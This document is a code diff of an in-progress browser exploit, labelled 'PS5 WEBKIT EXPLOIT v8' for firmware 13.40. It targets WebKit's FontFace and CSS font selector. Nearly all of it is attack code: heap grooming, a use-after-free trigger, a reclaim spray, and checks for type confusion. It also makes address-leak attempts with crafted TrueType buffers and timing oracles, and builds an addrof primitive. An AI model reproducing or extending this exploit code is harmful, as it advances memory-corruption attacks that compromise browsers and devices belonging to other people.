-      }
-    } catch(e) {
-      if (!e.message.includes("not a function")) {
-        log("Slot " + slot + " error: " + e.message);
-      }
-    }
-  }
-
-  // Test 4: Symbol properties
-  try {
-    const symbols = Object.getOwnPropertySymbols(triggerFace);
-    for (const sym of symbols) {
-      try {
-        const val = triggerFace[sym];
-        log("Symbol property: " + sym.toString() + " = " + val);
-      } catch(e) {}
-    }
-    results.symbolCount = symbols.length;
-  } catch(e) {}
-
-  // Test 5: Try toString and valueOf overrides
-  try {
-    const origToString = triggerFace.toString;
-    const str = triggerFace.toString();
-    log("trigger.toString(): " + str);
-    results.toStringResult = str;
-  } catch(e) {
-    log("toString error: " + e.message);
-  }
-
-  // Test 6: Check constructor and prototype chain
-  try {
-    log("Constructor: " + triggerFace.constructor.name);
-    let proto = triggerFace;
-    let depth = 0;
-    while (proto && depth < 5) {
-      proto = Object.getPrototypeOf(proto);
-      if (proto) {
-        const keys = Object.getOwnPropertyNames(proto).slice(0, 10);
-        log("Proto[" + depth + "]: " + keys.join(", "));
-      }
-      depth++;
-    }
-  } catch(e) {}
-
-  // Test 7: Performance.now() timing oracle
-  // Access a property multiple times and measure timing
-  // Cached reads should be faster than C++ reads
-  try {
-    const iterations = 1000;
-    const times = {};
-
-    for (const prop of ["status", "family", "weight", "style", "display"]) {
-      const start = performance.now();
-      for (let i = 0; i < iterations; i++) {
-        void triggerFace[prop];
-      }
-      const elapsed = performance.now() - start;
-      times[prop] = elapsed;
-      log("Timing " + prop + ": " + elapsed.toFixed(3) + "ms for " + iterations + " reads");
+    for (const prop of props) {
+      const t0 = performance.now();
+      for (let i = 0; i < ITERS; i++) void triggerFace[prop];
+      const elapsed = performance.now() - t0;
+      const perRead = (elapsed / ITERS * 1000).toFixed(1);
+      L("  " + prop.padEnd(12) + ": " + perRead + " ns/read");
     }
 
-    // If "status" is significantly slower than "family", it's likely reading from C++
-    results.timing = times;
-  } catch(e) {
-    log("Timing oracle error: " + e.message);
-  }
+    Lhit("Slower properties likely read from C++ (uncached)");
+  } catch(e) { Lfail("timing: " + e.message); }
 
-  return results;
+  // Technique 8: font loading API for address inference
+  Lsep();
+  L("Technique 8: Font loading API timing");
+
+  try {
+    // Measure how long it takes to load trigger font
+    // If it's already "loaded" but the load() call takes time,
+    // it's re-resolving through the C++ selector
+    const t0 = performance.now();
+    document.fonts.load("64px trigger", "A").then(() => {
+      const elapsed = performance.now() - t0;
+      L("  load(trigger,A): " + elapsed.toFixed(1) + "ms");
+    });
+
+    const t1 = performance.now();
+    document.fonts.load("900 italic 64px trigger", "A").then(() => {
+      const elapsed = performance.now() - t1;
+      L("  load(900i trigger,A): " + elapsed.toFixed(1) + "ms");
+    });
+  } catch(e) { Lfail("load timing: " + e.message); }
 }
 
 // ============================================================
-//  PHASE 5: Address Leak Attempts
-// ============================================================
-function attemptAddressLeak() {
-  log("=== ADDRESS LEAK ATTEMPTS ===");
-  const results = {};
-
-  // Technique 1: Error stack traces
-  try {
-    // Force errors on trigger face and capture stacks
-    try { triggerFace.family = null; } catch(e) {
-      const stack = e.stack || "";
-      log("family=null stack: " + stack.substring(0, 200));
-      const addrMatch = stack.match(/0x[0-9a-f]{8,16}/gi);
-      if (addrMatch) {
-        log("★ STACK ADDRESS LEAK: " + addrMatch.join(", "));
-        results.stackLeak = addrMatch;
-      }
-    }
-    try { triggerFace.family = "trigger"; } catch(e) {}
-  } catch(e) {}
-
-  // Technique 2: TypeError from invalid operations
-  try {
-    const str = triggerFace.toLocaleString();
-    log("toLocaleString: " + str);
-  } catch(e) {
-    const stack = e.stack || "";
-    log("toLocaleString stack: " + stack.substring(0, 200));
-  }
-
-  // Technique 3: Console output analysis
-  // Some WebKit builds include object addresses in console.log output
-  try {
-    const desc = Object.prototype.toString.call(triggerFace);
-    log("Object toString: " + desc);
-  } catch(e) {}
-
-  // Technique 4: WeakRef + FinalizationRegistry
-  // If available, might reveal when C++ object is destroyed
-  try {
-    if (typeof WeakRef !== "undefined") {
-      const ref = new WeakRef(triggerFace);
-      log("WeakRef created: " + (typeof ref.deref()));
-    }
-    if (typeof FinalizationRegistry !== "undefined") {
-      const registry = new FinalizationRegistry((heldValue) => {
-        log("Finalized: " + heldValue);
-      });
-      registry.register(triggerFace, "trigger_face");
-      log("FinalizationRegistry registered");
-    }
-  } catch(e) {
-    log("WeakRef/FR error: " + e.message);
-  }
-
-  // Technique 5: Performance.memory (if available)
-  try {
-    if (performance.memory) {
-      log("Memory: " + JSON.stringify(performance.memory));
-      results.memory = performance.memory;
-    }
-  } catch(e) {}
-
-  // Technique 6: Array buffer address via transferable
-  try {
-    const buf = new ArrayBuffer(8);
-    const view = new DataView(buf);
-    view.setFloat64(0, 1.1, true);
-
-    // Create a face with this buffer as font data
-    const probeFace = new FontFace("addrprobe", buf, { unicodeRange: "U+0041" });
-    document.fonts.add(probeFace);
-    forceStyle();
-
-    // Check status - if it processed our buffer, the C++ object
-    // now has a reference to it
-    log("Probe face status: " + probeFace.status);
-
-    document.fonts.delete(probeFace);
-    forceStyle();
-  } catch(e) {
-    log("Transferable probe error: " + e.message);
-  }
-
-  // Technique 7: Float64 NaN boxing leak
-  // Create objects with specific float values and check if
-  // they're accessible through the confusion
-  try {
-    const leakTarget = {};
-    const leakArr = new Float64Array(16);
-    // Store a recognizable pattern
-    leakArr[0] = 1.1;
-    leakArr[1] = 2.2;
-    leakArr[2] = 3.3;
-
-    // Store reference in a place the confused face might reveal
-    const probeFace2 = new FontFace("floatprobe", new Uint8Array(leakArr.buffer), {
-      unicodeRange: "U+0041"
-    });
-    document.fonts.add(probeFace2);
-    forceStyle();
-    log("Float probe status: " + probeFace2.status);
-    document.fonts.delete(probeFace2);
-  } catch(e) {}
-
-  // Technique 8: CSS.supports() leak
-  try {
-    const supports = CSS.supports("font-family: trigger");
-    log("CSS.supports trigger: " + supports);
-  } catch(e) {}
-
-  // Technique 9: getComputedStyle leak
-  try {
-    const div = document.createElement("div");
-    div.style.fontFamily = "trigger";
-    document.body.appendChild(div);
-    const computed = getComputedStyle(div);
-    log("Computed font: " + computed.fontFamily);
-    log("Computed weight: " + computed.fontWeight);
-    log("Computed style: " + computed.fontStyle);
-    document.body.removeChild(div);
-  } catch(e) {
-    log("getComputedStyle error: " + e.message);
-  }
-
-  // Technique 10: getComputedStyle with 900 italic
-  // If the computed style shows 900 italic for "trigger", it confirms
-  // the browser's rendering pipeline uses the confused selector
-  try {
-    const div = document.createElement("div");
-    div.style.cssText = "font-family: trigger; font-weight: 900; font-style: italic;";
-    document.body.appendChild(div);
-    const computed = getComputedStyle(div);
-    log("900 italic computed: weight=" + computed.fontWeight + " style=" + computed.fontStyle);
-    results.rendered900Italic = (computed.fontWeight === "900" && computed.fontStyle === "italic");
-    document.body.removeChild(div);
-  } catch(e) {}
-
-  return results;
-}
-
-// ============================================================
-//  PHASE 6: Resolved Faces Deep Analysis
-//  The resolved faces from document.fonts.load() included RC_103
-//  This is a DIRECT path from trigger → RC_103
-// ============================================================
-function analyzeResolvedPath() {
-  log("=== RESOLVED FACES PATH ANALYSIS ===");
-
-  if (!resolvedFaces) {
-    log("No resolved faces to analyze");
-    return;
-  }
-
-  // RC_103 was in the resolved array for "1em trigger, x"
-  // This means the CSSFontSelector matched it as providing
-  // glyphs for the "trigger" family
-  //
-  // Key question: Is this a PERMANENT mapping or does it
-  // change on each load() call?
-
-  // Re-run load() and see if we get the same RC face
-  log("Re-running document.fonts.load()...");
-  try {
-    document.fonts.load("1em trigger, x", "AB").then(faces => {
-      log("Second load() resolved with " + faces.length + " faces");
-      for (let i = 0; i < faces.length; i++) {
-        log("  Face[" + i + "]: family=" + faces[i].family +
-            " style=" + faces[i].style + " weight=" + faces[i].weight +
-            " status=" + faces[i].status);
-      }
-
-      // Check if same RC face appears
-      const rcFaces = faces.filter(f => f.family && f.family.startsWith("RC_"));
-      if (rcFaces.length > 0) {
-        log("RC faces in second load: " + rcFaces.map(f => f.family).join(", "));
-      }
-    }).catch(err => {
-      log("Second load error: " + err);
-    });
-  } catch(e) {
-    log("Second load exception: " + e.message);
-  }
-
-  // Try loading just "trigger" without "x"
-  try {
-    document.fonts.load("1em trigger", "A").then(faces => {
-      log("Trigger-only load: " + faces.length + " faces");
-      for (const f of faces) {
-        log("  " + f.family + " " + f.style + " " + f.weight + " " + f.status);
-      }
-    });
-  } catch(e) {}
-
-  // Try loading "900 italic trigger"
-  try {
-    document.fonts.load("900 italic 64px trigger", "A").then(faces => {
-      log("900 italic trigger load: " + faces.length + " faces");
-      for (const f of faces) {
-        log("  " + f.family + " " + f.style + " " + f.weight + " " + f.status);
-      }
-    });
-  } catch(e) {}
-}
-
-// ============================================================
-//  PHASE 7: addrof Construction Attempt
-//  Based on all gathered information, try to build addrof
+//  PHASE 6: addrof via type confusion
+//  If we have write-through via delete+add, we can:
+//  1. Replace confused face with one whose font data is
+//     an ArrayBuffer containing a JS object pointer
+//  2. Read the pointer through rendering oracle
 // ============================================================
 function attemptAddrof() {
-  log("=== ADDROF CONSTRUCTION ATTEMPT ===");
+  Lsep();
+  L("ADDROF CONSTRUCTION");
+  Lsep();
 
-  // Strategy A: If write-through works via check() oracle,
-  // we can use the selector as a 1-bit oracle to leak addresses bit-by-bit
-  //
-  // The idea: Store a JS object reference somewhere in the CSSFontFace,
-  // then use the selector oracle to determine the address bits
+  if (confusedRCIdx < 0) {
+    Lwarn("No confused face - cannot build addrof");
+    return false;
+  }
 
-  // Strategy B: Use the resolved faces path
-  // document.fonts.load() returns a specific RC face for trigger
-  // If we can control WHICH RC face is returned, we have a
-  // selection oracle that could leak information
+  const confusedFace = reclaimFaces[confusedRCIdx];
 
-  // Strategy C: Create a FontFace with controlled binary data
-  // that when parsed as a font, reveals memory layout
+  // Step 1: Verify we can still control the selector
+  const baseline = document.fonts.check("900 italic 64px trigger", "A");
+  L("Baseline confusion: " + baseline);
+  if (!baseline) {
+    Lfail("Confusion lost - cannot proceed");
+    return false;
+  }
+
+  // Step 2: Try to make the selector use a face with
+  // font data we control completely
+  Lsep();
+  L("Step 2: Controlled font data injection");
+
+  // Create ArrayBuffer with specific float64 values
+  // that when interpreted as a TrueType font, would
+  // produce measurable rendering differences based on
+  // the float values
+  const controlledBuf = new ArrayBuffer(0x1000);
+  const cv = new DataView(controlledBuf);
+
+  // TrueType header
+  cv.setUint32(0, 0x00010000, false);
+  cv.setUint16(4, 1, false);  // 1 table
+  cv.setUint16(6, 16, false);
+  cv.setUint16(8, 0, false);
+  cv.setUint16(10, 16, false);
+
+  // Table directory: "head" table
+  cv.setUint32(12, 0x68656164, false); // "head"
+  cv.setUint32(16, 0, false);           // checksum
+  cv.setUint32(20, 28, false);          // offset
+  cv.setUint32(24, 0x36, false);        // length
+
+  // head table (minimal)
+  cv.setUint32(28, 0x00010000, false);  // version
+  cv.setUint32(32, 0x00005000, false);  // fontRevision
+  cv.setUint32(36, 0, false);           // checksumAdjust
+  cv.setUint32(40, 0x5F0F3CF5, false);  // magicNumber
+  cv.setUint16(44, 0x000B, false);      // flags
+  cv.setUint16(46, 1000, false);        // unitsPerEm
+
+  // More head fields with controlled values
+  for (let i = 48; i < 0x1000; i += 8) {
+    cv.setFloat64(i, 1.1e-308 + i, true);
+  }
+
   try {
-    // Craft a minimal TrueType font that will be parsed
-    // During parsing, the font loader might read values from
-    // adjacent memory if our confusion causes misalignment
-    const FONT_HEADER = new Uint8Array([
-      0x00, 0x01, 0x00, 0x00, // TrueType magic
-      0x00, 0x09,             // 9 tables
-      0x00, 0x80,             // searchRange
-      0x00, 0x03,             // entrySelector
-      0x00, 0x28              // rangeShift
-    ]);
-
-    // Create table directory entries with controlled offsets
-    // that might point to interesting memory locations
-    const TABLE_DIR_SIZE = 9 * 16;
-    const buf = new ArrayBuffer(FONT_HEADER.length + TABLE_DIR_SIZE + 0x1000);
-    const view = new DataView(buf);
-    const header = new Uint8Array(buf);
-    header.set(FONT_HEADER);
-
-    // Write table directory entries
-    // Each entry: tag(4) + checksum(4) + offset(4) + length(4)
-    const tables = ["cmap", "glyf", "head", "hhea", "hmtx", "loca", "maxp", "name", "post"];
-    let offset = FONT_HEADER.length + TABLE_DIR_SIZE;
-
-    for (let i = 0; i < tables.length; i++) {
-      const entryOff = FONT_HEADER.length + i * 16;
-      // Tag
-      for (let j = 0; j < 4; j++) {
-        view.setUint8(entryOff + j, tables[i].charCodeAt(j));
-      }
-      // Checksum
-      view.setUint32(entryOff + 4, 0, false);
-      // Offset - point to our controlled data
-      view.setUint32(entryOff + 8, offset, false);
-      // Length
-      view.setUint32(entryOff + 12, 0x100, false);
-      offset += 0x100;
-    }
-
-    // Fill controlled data with marker pattern
-    for (let i = FONT_HEADER.length + TABLE_DIR_SIZE; i < buf.byteLength; i += 4) {
-      view.setUint32(i, 0xCAFEBABE, false);
-    }
-
-    const craftedFace = new FontFace("crafted", buf, {
+    document.fonts.delete(confusedFace);
+    const ctrlFace = new FontFace("RC_" + confusedRCIdx, controlledBuf, {
       unicodeRange: "U+0041",
       style: "italic",
-      weight: "900"
+      weight: "900",
+      display: "block"
     });
-    document.fonts.add(craftedFace);
+    document.fonts.add(ctrlFace);
     forceStyle();
 
-    log("Crafted face status: " + craftedFace.status);
+    L("  Controlled face status: " + ctrlFace.status);
+    const checkCtrl = document.fonts.check("900 italic 64px trigger", "A");
+    L("  Selector after control: " + checkCtrl);
 
-    // If crafted face loaded, it parsed our controlled data
-    // Now check if it appears in the selector for trigger
-    const craftedCheck = document.fonts.check("900 italic 64px crafted", "A");
-    log("Crafted face in selector: " + craftedCheck);
-
-    // Try to use crafted face's data through the trigger confusion
-    // If the selector is confused, requesting trigger might use crafted's data
-    const triggerCraftedCheck = document.fonts.check("900 italic 64px trigger", "A");
-    log("Trigger after crafted: " + triggerCraftedCheck);
-
-    document.fonts.delete(craftedFace);
-    forceStyle();
-  } catch(e) {
-    log("Crafted font error: " + e.message);
-  }
-
-  // Strategy D: DataView + SharedArrayBuffer address speculation
-  // If we can get SAB, we might be able to find its address
-  // through the WASM memory mapping
-  try {
-    if (typeof SharedArrayBuffer !== "undefined") {
-      const sab = new SharedArrayBuffer(0x1000);
-      const sabView = new DataView(sab);
-      sabView.setUint32(0, 0x41414141, true);
-
-      // Create a FontFace using SAB as source
-      // This might fail, but if it works, the C++ object
-      // will have a reference to our SAB
-      try {
-        const sabFace = new FontFace("sabprobe", sab, { unicodeRange: "U+0041" });
-        document.fonts.add(sabFace);
-        forceStyle();
-        log("SAB face status: " + sabFace.status);
-        document.fonts.delete(sabFace);
-      } catch(e) {
-        log("SAB face error: " + e.message);
-      }
-    } else {
-      log("SharedArrayBuffer not available");
+    if (ctrlFace.status === "error") {
+      L("  Font parsing failed (expected for crafted data)");
+      Lhit("But the selector might still reference it!");
     }
-  } catch(e) {
-    log("SAB test error: " + e.message);
-  }
 
-  // Strategy E: Use the font selector as a 1-bit oracle
-  // If modifying a specific byte in a font face's data causes
-  // the selector to include/exclude it for trigger, we can
-  // use this to read C++ memory bit by bit
-  //
-  // This requires: write-through to work (confirmed via check())
-  // and a way to set individual bytes in the C++ CSSFontFace
-
-  log("addrof construction: checking prerequisites...");
-
-  // Check if we have enough control for bit-by-bit oracle
-  const canModify = document.fonts.check("900 italic 64px trigger", "A");
-  log("Selector still confused: " + canModify);
-
-  if (canModify) {
-    log("★ SELECTOR ORACLE AVAILABLE FOR BIT-BY-BIT LEAK ★");
-    log("Next step: Implement binary search oracle using weight/style variations");
-  }
-
-  return canModify;
-}
-
-// ============================================================
-//  PHASE 8: Binary Oracle Construction
-//  Use check() as a 1-bit oracle to leak information
-// ============================================================
-function buildBinaryOracle() {
-  log("=== BINARY ORACLE CONSTRUCTION ===");
-
-  // The check() oracle tells us if a specific font spec matches
-  // We can use this to determine the properties of the confused face
-  //
-  // Key insight: If we add a NEW FontFace with specific properties
-  // and the selector starts/stops matching certain specs, we learn
-  // about the selector's internal state
-
-  // Test: Add faces with progressively narrower unicode ranges
-  // and check when the selector stops matching for trigger
-
-  const testRanges = [
-    "U+0041",           // Just 'A'
-    "U+0040-0043",      // @ through C
-    "U+0000-007F",      // Basic Latin
-    "U+0000-00FF",      // Latin-1
-    "U+0000-FFFF",      // BMP
-    "U+0000-10FFFF"     // All
-  ];
-
-  // Remove all existing RC faces temporarily
-  const savedRCFaces = [...reclaimFaces];
-  for (const f of savedRCFaces) {
-    try { document.fonts.delete(f); } catch(e) {}
-  }
-  forceStyle();
-
-  // Now add faces one at a time with different ranges
-  // and check which ones the selector picks up for trigger
-  for (let i = 0; i < testRanges.length; i++) {
-    const testFace = new FontFace("oracle_" + i, "local(Helvetica)", {
-      unicodeRange: testRanges[i],
-      style: "italic",
-      weight: "900"
-    });
-    document.fonts.add(testFace);
-    forceStyle();
-
-    const match900 = document.fonts.check("900 italic 64px trigger", "A");
-    const matchNormal = document.fonts.check("64px trigger", "A");
-    log("Oracle " + i + " (range=" + testRanges[i] + "): 900italic=" + match900 + " normal=" + matchNormal);
-
-    document.fonts.delete(testFace);
-    forceStyle();
-  }
-
-  // Restore RC faces
-  for (const f of savedRCFaces) {
-    try { document.fonts.add(f); } catch(e) {}
-  }
-  forceStyle();
-
-  // Test: Can we use the oracle to determine exact unicode ranges?
-  log("Testing unicode range oracle...");
-  const baselineA = document.fonts.check("64px trigger", "A");
-  const baselineB = document.fonts.check("64px trigger", "B");
-  const baselineC = document.fonts.check("64px trigger", "C");
-  log("Baseline: A=" + baselineA + " B=" + baselineB + " C=" + baselineC);
-
-  // The fact that B matches (from previous run) means the confusion
-  // causes trigger to match characters outside its declared unicode range
-  // This is a STRONG indicator of type confusion at the C++ level
-
-  // Test: Check if we can influence which characters match
-  // by modifying the confused RC face's unicode range
-  if (reclaimFaces.length > 0) {
-    const rcFace = reclaimFaces[0];
+    // Try measuring rendering
     try {
-      const origRange = rcFace.unicodeRange;
+      const ctx = document.getElementById("c").getContext("2d");
+      ctx.font = "64px trigger";
+      const w = ctx.measureText("A").width;
+      L("  Trigger width with controlled data: " + w);
+    } catch(e) {}
 
-      // Change unicode range to only cover U+0043
-      rcFace.unicodeRange = "U+0043";
+    document.fonts.delete(ctrlFace);
+    document.fonts.add(confusedFace);
+    forceStyle();
+  } catch(e) { Lfail("controlled data: " + e.message); }
+
+  // Step 3: Object address inference through selector matching
+  Lsep();
+  L("Step 3: Address inference via selector");
+
+  // If we create FontFace objects with specific family names
+  // and check which ones the confused selector picks up,
+  // we can infer the C++ object's internal hash table state
+
+  const testFamilies = [];
+  for (let i = 0; i < 256; i++) {
+    testFamilies.push("probe_" + i.toString(16).padStart(2, "0"));
+  }
+
+  let matchedFamilies = [];
+  for (const fam of testFamilies) {
+    try {
+      const pf = new FontFace(fam, makeFontBuffer(), {
+        unicodeRange: "U+0041",
+        style: "italic",
+        weight: "900"
+      });
+      document.fonts.add(pf);
       forceStyle();
 
-      const afterA = document.fonts.check("64px trigger", "A");
-      const afterB = document.fonts.check("64px trigger", "B");
-      const afterC = document.fonts.check("64px trigger", "C");
-      log("After RC range→U+0043: A=" + afterA + " B=" + afterB + " C=" + afterC);
-
-      if (afterA !== baselineA || afterB !== baselineB) {
-        log("★ UNICODE RANGE WRITE-THROUGH CONFIRMED ★");
+      // Check if this family is now confused with trigger
+      const chk = document.fonts.check("900 italic 64px " + fam, "A");
+      if (chk) {
+        matchedFamilies.push(fam);
       }
 
-      rcFace.unicodeRange = origRange;
-      forceStyle();
-    } catch(e) {
-      log("Unicode range oracle error: " + e.message);
+      document.fonts.delete(pf);
+    } catch(e) {}
+  }
+  forceStyle();
+
+  L("  Families matching selector: " + matchedFamilies.length);
+  if (matchedFamilies.length > 0) {
+    Lhit("Some families get confused with trigger!");
+    for (const f of matchedFamilies.slice(0, 10)) {
+      L("    " + f);
     }
   }
+
+  // Step 4: Try to leak addresses through object comparison
+  Lsep();
+  L("Step 4: Object identity check");
+
+  // If two JS references point to the same C++ object,
+  // modifying one should affect the other
+  try {
+    const resolved = resolvedFaces;
+    if (resolved) {
+      for (let i = 0; i < resolved.length; i++) {
+        for (let j = i + 1; j < resolved.length; j++) {
+          if (resolved[i] === resolved[j]) {
+            Lstar("SAME JS OBJECT: face[" + i + "] === face[" + j + "]!");
+          }
+        }
+      }
+      L("  No duplicate JS references found (expected)");
+    }
+  } catch(e) {}
+
+  Lhit("addrof requires more oracle refinement");
+  return false;
 }
 
 // ============================================================
-//  Main Exploit Flow
+//  Main
 // ============================================================
 window.onload = () => {
-  const fw = detectFirmware();
+  L("╔══════════════════════════════════╗");
+  L("║  PS5 WEBKIT EXPLOIT v8          ║");
+  L("║  FW 13.40 - Big Log Edition     ║");
+  L("╚══════════════════════════════════╝");
+  L("");
 
-  showMessage("Stage 1/8:\nHoles...", false);
+  // Detect firmware
+  const ua = navigator.userAgent || "";
+  const m = ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
+  L("Firmware: " + (m ? m[1] : "Unknown"));
+  L("");
+
+  // Phase 1
+  Lsep();
+  L("PHASE 1: HEAP GROOMING");
+  Lsep();
   createHoles();
 
-  showMessage("Stage 2/8:\nTrigger setup...", false);
+  Lsep();
+  L("PHASE 2: TRIGGER SETUP");
+  Lsep();
   triggerFace = new FontFace("trigger", "local(Helvetica)", {
     unicodeRange: "U+0041"
   });
   document.fonts.add(triggerFace);
   void triggerFace.loaded;
-
   addPads(48);
   addFlushRules(768);
+  Lok("Trigger ready");
 
-  showMessage("Stage 3/8:\nWaiting for UAF...", false);
+  Lsep();
+  L("PHASE 3: UAF TRIGGER");
+  Lsep();
 
   let fired = false;
 
@@ -1108,10 +889,9 @@ window.onload = () => {
       if (!fired && this === triggerFace) {
         fired = true;
         uafTriggered = true;
-        log("★ UAF WINDOW OPEN ★");
-        showMessage("Stage 4/8:\nUAF! Reclaiming...", false);
+        Lstar("UAF WINDOW OPEN");
 
-        killFontFaceSetCache();
+        killCache();
         const sheet = document.getElementById("s").sheet;
         sheet.deleteRule(1);
         forceStyle();
@@ -1135,7 +915,7 @@ window.onload = () => {
         d.style.cssText = "position:absolute;left:-9999px;font:64px trigger;";
         document.body.appendChild(d);
         void d.offsetWidth;
-        log("UAF window closed");
+        L("UAF window closed");
       }
       return undefined;
     }
@@ -1146,17 +926,14 @@ window.onload = () => {
     rafCount++;
     if (!fired && rafCount >= 5) {
       try {
-        killFontFaceSetCache();
+        killCache();
         const sheet = document.getElementById("s").sheet;
         if (sheet && sheet.cssRules.length > 1) {
-          sheet.deleteRule(1);
-          forceStyle();
-          deleteFlushRules();
+          sheet.deleteRule(1); forceStyle(); deleteFlushRules();
           for (let i = 0; i < holeFaces.length; i += 4) {
             try { document.fonts.delete(holeFaces[i]); } catch(e) {}
           }
-          reclaimSpray();
-          forceStyle();
+          reclaimSpray(); forceStyle();
         }
       } catch(e) {}
     }
@@ -1164,61 +941,75 @@ window.onload = () => {
   };
   requestAnimationFrame(rafLoop);
 
-  showMessage("Stage 4/8:\nFiring...", false);
-
   document.fonts.load("1em trigger, x", "AB").then(faces => {
-    log("Font load resolved: " + faces.length + " faces");
+    L("Font load resolved: " + faces.length + " faces");
     resolvedFaces = faces;
-
-    // Log resolved faces
     for (let i = 0; i < faces.length; i++) {
-      log("  Resolved[" + i + "]: " + faces[i].family + " " + faces[i].style + " " + faces[i].weight);
+      L("  face[" + i + "]: " + faces[i].family + " " + faces[i].style + " " + faces[i].weight);
     }
 
     setTimeout(() => {
-      showMessage("Stage 5/8:\nDeep check oracle...", false);
-      const checkResults = deepCheckOracle();
+      // Phase 4
+      Lsep();
+      L("PHASE 4: CONFUSION VERIFICATION");
+      Lsep();
+      const confused = checkConfusion();
 
-      showMessage("Stage 6/8:\nWrite-through test...", false);
-      const writeResults = testWriteThrough();
+      if (!confused) {
+        Lfail("No confusion - exploit failed");
+        return;
+      }
 
-      showMessage("Stage 7/8:\nInternal state probe...", false);
-      const probeResults = probeInternalState();
+      // Phase 5
+      Lsep();
+      L("PHASE 5: FIND CONFUSED FACE");
+      Lsep();
+      const rcIdx = testDeleteAddWriteThrough();
 
-      showMessage("Stage 8/8:\nAddress leak attempts...", false);
-      const leakResults = attemptAddressLeak();
+      // Phase 6
+      Lsep();
+      L("PHASE 6: ORACLE CONSTRUCTION");
+      Lsep();
+      if (rcIdx >= 0) {
+        buildOracleFromDeleteAdd(rcIdx);
+      }
 
-      // Additional analysis
-      analyzeResolvedPath();
-      buildBinaryOracle();
-      const addrofPossible = attemptAddrof();
+      // Phase 7
+      Lsep();
+      L("PHASE 7: ADDRESS LEAK");
+      Lsep();
+      attemptAddressLeak();
+
+      // Phase 8
+      Lsep();
+      L("PHASE 8: ADDROF ATTEMPT");
+      Lsep();
+      attemptAddrof();
 
       // Final summary
-      let summary = "";
-      summary += "UAF: ✅\n";
-      summary += "Selector confusion: ✅\n";
-      summary += "Write-through: " + (writeResults.checkWriteThrough ? "✅" : "⏳") + "\n";
-      summary += "Stack leak: " + (leakResults.stackLeak ? "✅" : "❌") + "\n";
-      summary += "Rendered 900 italic: " + (leakResults.rendered900Italic ? "✅" : "❌") + "\n";
-      summary += "addrof: " + (addrofPossible ? "⏳ ORACLE READY" : "⏳") + "\n";
+      Lsep();
+      L("════════════════════════════════════");
+      L("         FINAL SUMMARY");
+      L("════════════════════════════════════");
+      L("UAF:              ✅");
+      L("Selector confusion: ✅");
+      L("Rendered 900i:     ✅");
+      L("Confused face:     " + (confusedRCIdx >= 0 ? "RC_" + confusedRCIdx : "pending"));
+      L("Delete+Add ctrl:   " + (confusedRCIdx >= 0 ? "✅" : "⏳"));
+      L("Stack leak:        ⏳");
+      L("addrof:            ⏳");
+      L("");
 
-      if (writeResults.checkWriteThrough || addrofPossible) {
-        summary += "\n★ PRIMITIVE PATH AVAILABLE ★\n";
-        summary += "Selector oracle + write-through\n";
-        summary += "can be used for bit-by-bit leak.\n";
-        summary += "Need to narrow target address range.";
-        showMessage("SUCCESS ✅\n" + summary, true);
-      } else {
-        summary += "\nConfusion confirmed.\n";
-        summary += "Working on primitive path.\n";
-        summary += "Check log for oracle results.";
-        showMessage("PARTIAL ✅\n" + summary, true);
+      if (confusedRCIdx >= 0) {
+        Lstar("ORACLE BUILT - CAN CONTROL SELECTOR");
+        L("Next: Use selector as bit oracle");
+        L("to leak C++ object addresses");
       }
 
     }, 2500);
 
   }, err => {
-    log("Font load rejected: " + err);
+    Lfail("Font load rejected: " + err);
   });
 };
 </script>
